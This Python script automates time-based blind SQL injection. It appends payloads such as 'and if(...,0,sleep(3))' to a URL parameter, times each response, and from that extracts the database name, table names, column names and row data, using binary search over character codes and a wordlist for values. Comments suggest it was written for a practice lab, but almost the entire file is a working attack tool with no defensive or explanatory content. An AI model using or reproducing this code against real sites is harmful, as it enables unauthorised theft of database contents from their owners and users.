import time
import requests

def log(content):
    this_time = time.strftime('%H:%M:%S', time.localtime(time.time()))
    print('[' + str(this_time) + '] ' + content)

def get_prefix_url(url):
    splits = url.split('=')
    splits.remove(splits[-1])
    prefix_url = ''
    for item in splits:
        prefix_url += str(item)
    return prefix_url



class Time_blind():
    def time_inject_database_length(url,symbol):
        prefix_url = get_prefix_url(url)
        for i in range(1,25):#自我觉得25的库名称已经够长了
            test_url= prefix_url + '=1' + symbol +'and%20if((length(database())>'+str(i)+'),0,sleep(3))--+'
            test_url = test_url + '%23'
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:
                return i

    # def time_inject_database(url,symbol,database_length):
    #     prefix_url = get_prefix_url(url)
    #     for i in range(97,123):
    #         test_url = prefix_url + '=1' + symbol + 'and%20if%20(ascii(substr(database(),'+str(database_length)+',1))>'+str(i)+',0,sleep(3))'
    #         test_url = test_url + '%23'
    #         log(test_url)
    #         time = requests.get(test_url).elapsed.total_seconds()
    #         if time > 2.5:  #经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
    #             return i

    def time_inject_database(url, symbol, database_length):
        prefix_url = get_prefix_url(url)
        guess_list = [i for i in range(46, 123)]
        min_number = min(guess_list)  # 最小数
        max_number = max(guess_list)  # 最大数
        while 1:
            mid_number = (max_number + min_number) // 2  # 中间数
            test_url = prefix_url + '=1' + symbol + 'and%20if%20(ascii(substr(database(),' + str(
                database_length) + ',1))>' + str(mid_number) + ',0,sleep(3))--+'
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:
                max_number = mid_number
                mid_number = (max_number + min_number) // 2
                test_url = prefix_url + '=1' + symbol + 'and%20if%20(ascii(substr(database(),' + str(
                    database_length) + ',1))>' + str(mid_number) + ',0,sleep(3))--+'
                log(test_url)
                time = requests.get(test_url).elapsed.total_seconds()
                if max_number - mid_number == 1:
                    return max_number
                if time > 2.5:
                    max_number = mid_number
            else:
                min_number = mid_number
                mid_number = (max_number + min_number) // 2
                test_url = prefix_url + '=1' + symbol + 'and%20if%20(ascii(substr(database(),' + str(
                    database_length) + ',1))>' + str(mid_number) + ',0,sleep(3))--+'
                log(test_url)
                time = requests.get(test_url).elapsed.total_seconds()
                if time > 2.5:
                    max_number = mid_number
                if max_number - mid_number == 1:
                    return max_number

    def time_inject_database_name(url,symbol):
        database_length = Time_blind.time_inject_database_length(url,symbol)
        data = ''
        for j in range(1,database_length+1):
            data = data + chr(Time_blind.time_inject_database(url,symbol,j))
        return data

    def time_inject_table_count(url,symbol,database):
        prefix_url = get_prefix_url(url)
        for i in range(1,20):
            test_url=prefix_url+'=1' + symbol + "and%20if(((select count(table_name)%20from%20information_schema.tables where table_schema='"+database+"')>"+str(i)+"),0,sleep(3))"
            test_url = test_url + '%23'
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:  #经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
                return i

    def time_inject_table_length_1(url,symbol,count,database):
        prefix_url = get_prefix_url(url)
        for i in range(20):
            test_url = prefix_url+'=1' + symbol + "and%20if((length(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema='"+database+"'%20limit%20"+str(count)+",1),1))>"+str(i)+"),0,sleep(3))"
            test_url = test_url + '--+'
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:  # 经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
                return i

    def time_inject_table_length_2(url,symbol,count,database):
        list = []
        for i in range(count):
            list.append(Time_blind.time_inject_table_length_1(url,symbol,i,database))
        return list


    def time_inject_table_data_1(url, symbol, table_size_count, table_count_subscript, database):
        prefix_url = get_prefix_url(url)
        guess_list = [i for i in range(46, 123)]
        min_number = min(guess_list)  # 最小数
        max_number = max(guess_list)  # 最大数
        while 1:
            mid_number = (max_number + min_number) // 2  # 中间数
            test_url = prefix_url + '=1' + symbol + "and if(ascii(substr((select table_name from information_schema.tables where table_schema='" + database + "' limit " + str(table_count_subscript) + ",1)," + str(table_size_count) + ",1)) >" + str(mid_number) + ",1,sleep(3))--+"
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time>2.5:
                max_number=mid_number
                mid_number=(max_number + min_number) // 2
                test_url = prefix_url + '=1' + symbol + "and if(ascii(substr((select table_name from information_schema.tables where table_schema='" + database + "' limit " + str(
                    table_count_subscript) + ",1)," + str(table_size_count) + ",1)) >" + str(
                    mid_number) + ",1,sleep(3))--+"
                log(test_url)
                time = requests.get(test_url).elapsed.total_seconds()
                if max_number-mid_number ==1:
                    return max_number
                if time>2.5:
                    max_number = mid_number
            else:
                min_number = mid_number
                mid_number = (max_number + min_number) // 2
                test_url = prefix_url + '=1' + symbol + "and if(ascii(substr((select table_name from information_schema.tables where table_schema='" + database + "' limit " + str(
                    table_count_subscript) + ",1)," + str(table_size_count) + ",1)) >" + str(
                    mid_number) + ",1,sleep(3))--+"
                log(test_url)
                time = requests.get(test_url).elapsed.total_seconds()
                if time>2.5:
                    max_number = mid_number
                if max_number-mid_number ==1:
                    return max_number


    def time_inject_table_data_2(url,symbol,table_count,table_count_subscript,table_all_length,database):
        list = table_all_length
        data = ''
        for i in range(1,list[table_count]+1):
            data = data + chr(Time_blind.time_inject_table_data_1(url,symbol,i,table_count_subscript,database))
        return data

    def time_inject_table_data_3(url,symbol,count,table_all_length,database):
        data = ''
        for i in range(count):  #这里的4是代表的四个表
            data = data + Time_blind.time_inject_table_data_2(url,symbol,i,i,table_all_length,database)+'   '
        return data

    def time_inject_table_field(url,symbol,table,database):  #判断表中字段
        prefix_url = get_prefix_url(url)
        for i in range(50):
            test_url = prefix_url + '=1' + symbol + "and%20if(((select%20count(column_name)%20from%20information_schema.columns%20where%20table_name='"+table+"'%20and%20table_schema='"+database+"')>"+str(i)+"),0,sleep(3))"
            test_url = test_url + '--+'
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:  # 经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
                return i

    def time_inject_table_field_length_1(url,symbol,field_count,database,table):
        prefix_url = get_prefix_url(url)
        for i in range(20):
            test_url = prefix_url + '=1' + symbol + "and%20if((length(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='"+table+"'%20and%20table_schema='"+database+"'%20limit%20"+str(field_count)+",1),1))>"+str(i)+"),0,sleep(3))"
            test_url = test_url + '--+'
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:  # 经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
                return i

    def time_inject_table_field_length_2(url,symbol,database,table):  #获取各字段的长度
        list = []
        count = Time_blind.time_inject_table_field(url,symbol,table,database)
        for i in range(count):#这里的三是指的字段个数
            list.append(Time_blind.time_inject_table_field_length_1(url,symbol,i,database,table))
        return list

    # def time_inject_table_field_data_1(url,symbol,table_field_length,table_length_subscript,table,database):
    #     prefix_url = get_prefix_url(url)
    #     for i in range(97,123):
    #         test_url = prefix_url + '=1' + symbol + "and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='"+table+"'%20and%20table_schema='"+database+"'%20limit%20"+str(table_length_subscript)+",1),"+str(table_field_length)+"))>"+str(i)+"),0,sleep(3))"
    #         test_url = test_url + '--+'
    #         log(test_url)
    #         time = requests.get(test_url).elapsed.total_seconds()
    #         if time > 2.5:  # 经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
    #             return i

    def time_inject_table_field_data_1(url, symbol, table_field_length, table_length_subscript, table, database):
        prefix_url = get_prefix_url(url)
        guess_list = [i for i in range(46, 123)]
        min_number = min(guess_list)  # 最小数
        max_number = max(guess_list)  # 最大数
        while 1:
            mid_number = (max_number + min_number) // 2  # 中间数
            test_url = prefix_url + '=1' + symbol + "and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='" + table + "'%20and%20table_schema='" + database + "'%20limit%20" + str(
                table_length_subscript) + ",1)," + str(table_field_length) + "))>" + str(mid_number) + "),0,sleep(3))--+"
            log(test_url)
            time = requests.get(test_url).elapsed.total_seconds()
            if time > 2.5:
                max_number = mid_number
                mid_number = (max_number + min_number) // 2
                test_url = prefix_url + '=1' + symbol + "and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='" + table + "'%20and%20table_schema='" + database + "'%20limit%20" + str(
                    table_length_subscript) + ",1)," + str(table_field_length) + "))>" + str(
                    mid_number) + "),0,sleep(3))--+"
                log(test_url)
                time = requests.get(test_url).elapsed.total_seconds()
                if max_number - mid_number == 1:
                    return max_number
                if time > 2.5:
                    max_number = mid_number
            else:
                min_number = mid_number
                mid_number = (max_number + min_number) // 2
                test_url = prefix_url + '=1' + symbol + "and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='" + table + "'%20and%20table_schema='" + database + "'%20limit%20" + str(
                    table_length_subscript) + ",1)," + str(table_field_length) + "))>" + str(
                    mid_number) + "),0,sleep(3))--+"
                log(test_url)
                time = requests.get(test_url).elapsed.total_seconds()
                if time > 2.5:
                    max_number = mid_number
                if max_number - mid_number == 1:
                    return max_number

    def time_inject_table_field_data_2(url,symbol,table_length_subscript,table_field_length,database,table):

        list = table_field_length
        data = ''
        for i in range(1,list[table_length_subscript]+1):
            data = data + chr(Time_blind.time_inject_table_field_data_1(url,symbol,i,table_length_subscript,table,database))
        return data

    def time_inject_table_field_data_3(url,symbol,table_field_length,database,table):
        data = ''
        time = Time_blind.time_inject_table_field(url,symbol,table,database)
        for i in range(time):
            data = data + Time_blind.time_inject_table_field_data_2(url,symbol,i,table_field_length,database,table)+'   '
        return data


username = []
def open_dir(file):

    f = open(file, "r", encoding="gbk")
    for i in f.readlines():
        j=i.replace('\n', '')
        username.append(j)
    f.close()
    return username


def time_get_data_count(url, symbol,table,filed):  # 获取数据的长度
    url_template = url + symbol + "%20and%20if(((select%20length(" + filed + ")%20from%20" + table + "%20limit%20{0},1)>1),1,sleep(5)) %23"
    log(url_template)
    for i in range(0, 20):  # 此靶场的数据较少所以写了二十个
        url = url_template.format(i)
        time = requests.get(url).elapsed.total_seconds()
        if time > 4.5:  # 经过测试发现睡眠时间为5秒时，有不到5s的情况所以这里改为了4.5
            return i


def time_get_data(url,symbol,table,filed,dir_file):
    data = ""
    count = time_get_data_count(url,symbol,table,filed)
    usernames = open_dir(dir_file)

    for i in range(count):
        for user in usernames:
            url_template = url + symbol + "and if(((select "+filed+" from "+table+" limit "+str(i)+",1)='"+user+"'),sleep(3),1) %23"
            #print(url_template)
            log(url_template)
            time = requests.get(url_template).elapsed.total_seconds()
            if time > 2.5:
                data = data+ str(i+1)+"   "  +user+ "\n"
                break
    return data





